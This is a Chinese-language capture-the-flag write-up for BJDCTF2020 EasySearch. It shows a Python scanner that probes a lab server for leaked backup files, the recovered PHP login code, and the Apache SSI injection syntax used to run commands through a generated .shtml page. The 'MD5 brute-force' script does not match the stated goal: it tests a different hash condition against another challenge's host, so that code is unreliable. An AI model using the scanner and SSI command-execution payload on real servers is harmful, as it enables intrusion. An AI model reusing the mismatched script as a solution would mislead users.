# 原创
：  [BJDCTF2020]EasySearch

# [BJDCTF2020]EasySearch

#### [BJDCTF2020]EasySearch

## 考点

> 
Apache SSI 远程命令执行漏洞、敏感文件泄露


## 思路

> 
①：当目标服务器开启了SSI与CGI支持,我们就可以上传shtml，利用语法执行命令；<br/> 使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为"服务器端嵌入"或者叫"服务器端包含"，是一种类似于ASP的基于服务器的网页制作技术，默认扩展名是 .stm、.shtm 和 .shtml；<br/> ②：扫描一下目录，发现.swp备份文件；<br/> ③：审计一下代码：首先是随机获取文件名的一个函数，最关键的是让password前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中；<br/> ④：利用脚本让password前6个字符的md5值等于6d0bc1；<br/> ⑤：利用得到的password，抓包并登录；<br/> ⑥：返回包中会生成一个后缀为.shtml文件（并将用户名写入文件中），并且含有该文件的路径；<br/> ⑦：利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令：`&lt;!--#exec cmd="命令"--&gt;`；


## Payload

> 
**扫描敏感信息文件**


```
import requests
url = "http://77f9e06c-19c2-4cb0-bc34-c310120b0745.node3.buuoj.cn/"
bf = ['web.tar', 'web.tar.gz', 'web.zip', 'web.rar', 'website.tar', 'website.tar.gz', 'website.zip', 'website.rar', 'backup.tar', 'backup.tar.gz', 'backup.zip', 'backup.rar', 'back.tar', 'back.tar.gz', 'back.zip', 'back.rar', 'www.tar', 'www.tar.gz', 'www.zip', 'www.rar', 'wwwroot.tar', 'wwwroot.tar.gz', 'wwwroot.zip', 'wwwroot.rar', 'temp.tar', 'temp.tar.gz', 'temp.zip', 'temp.rar', 'index.php.swp', 'index.php.swo', 'index.php.swn', 'index.php.swm', 'index.php~', '.git', '.DS_Store', '.hg', '.bzr', '.index.php.swp', '.index.php.swo', '.index.php.swn', '.index.php.swm']
number = 1
for i in bf:
    url_final = url + i
    r = requests.get(url_final)
    print(r, url_final)
=&gt;
&lt;Response [200]&gt; http://77f9e06c-19c2-4cb0-bc34-c310120b0745.node3.buuoj.cn/index.php.swp

```

> 
**审计.swp泄露信息**


```
&lt;?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "&lt;script&gt;alert('[!] Failed')&lt;/script&gt;";
            
    }else
    {
	***
    }
	***
?&gt;

```

> 
**获取符合MD5截断值的password**


```
MD5截断值爆破：

import hashlib
import random
import requests

def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

# substr(md5($value),5,4)==0)
def findbest(s):
    for i in range(1000000):
        str = s + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        if (md5(str))[5:9] == "0000":
            print(str)
            return str

# 访问并截取新的关键字
def url_open(keystr, url, session):
    payload = "value=" + keystr
    respon = a.get(url + payload).text
    print(respon[0:2])
    return respon[0:2], len(respon), respon

# 初始连接 字符集
urllink = "http://aa153e3db8114f409fa459050284db8920827b2ffaa34944.game.ichunqiu.com/?"
# guess = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
guess = "abcdefghijklmnopqrstuvwxyz"
a = requests.session()

# 初始key关键字
keyfirst = 'ea'
# 普通返回长度
normallen = 0

for i in range(1, 100):
    # 寻找满足条件的字符串
    keystr = findbest(keyfirst)

    # 请求获取新的key关键字 记录普通长度 比对flag长度
    keyfirst, length, res = url_open(keystr, urllink, a)
    if i == 1:
        normallen = length
    else:
        if normallen &lt; length:
            print(res)
            break

```

> 
**登录抓包**


> 
访问返回的.shtml页面


> 
**利用SSI注入漏洞，查看当前目录下的文件**


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517183747656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517184114861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
**当前目录下并没有flag文件，访问上级目录试试**


> 
发现flag文件，cat它


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517184237196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517184244807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
